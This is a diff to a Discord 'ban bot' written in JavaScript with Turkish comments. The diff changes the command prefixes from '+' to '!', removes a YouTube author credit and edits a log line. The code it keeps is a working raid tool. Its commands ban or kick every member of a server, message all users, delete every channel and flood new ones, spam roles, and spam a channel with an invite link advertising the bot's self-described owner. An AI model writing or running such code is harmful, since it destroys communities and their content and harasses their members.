@@ -12,21 +12,21 @@ client.on('ready', () => {
 
 
 client.on("message", msg => {          
-  if (msg.content === "+ban") {
+  if (msg.content === "!ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());  
   }
 });       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban
 
 client.on("message", msg => {
-  if (msg.content === "+kick") {
+  if (msg.content === "!kick") {
     msg.delete();
     msg.guild.members.forEach(member => member.kick());
   }
 });      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
 
 client.on("message", async msg => {
-  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
+  if (msg.content === "!duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
     msg.delete();
     await msg.client.users
       .forEach(users =>
@@ -39,7 +39,7 @@ client.on("message", async msg => {
 });
 
 client.on("message", async msg => {
-  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+  if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
       await msg.guild.channels.deleteAll();        //TÜM KANALLARI SİLEN KOMUT
@@ -390,7 +390,7 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("1");  //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
+        chan.setUserLimit("1");  
       });
     
             await msg.guild
@@ -1263,7 +1263,7 @@ client.on("message", async msg => {
 
 
     client.on("message", msg => {
-  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
+  if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
       name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
@@ -1459,7 +1459,7 @@ client.on("message", async msg => {
 
 
 client.on('message', msg => {
-  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
+  if (msg.content === '!spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
          
     msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
     msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
@@ -1548,7 +1548,7 @@ const app = express();
   }    
 }
 app.get("/", (request, response) => {
-  console.log(Date.now() + " Ping tamamdır.");  ///null
+  console.log(Date.now() + " ping tamamlandı");  ///null
   response.sendStatus(200);
 });
 app.listen(process.env.PORT);
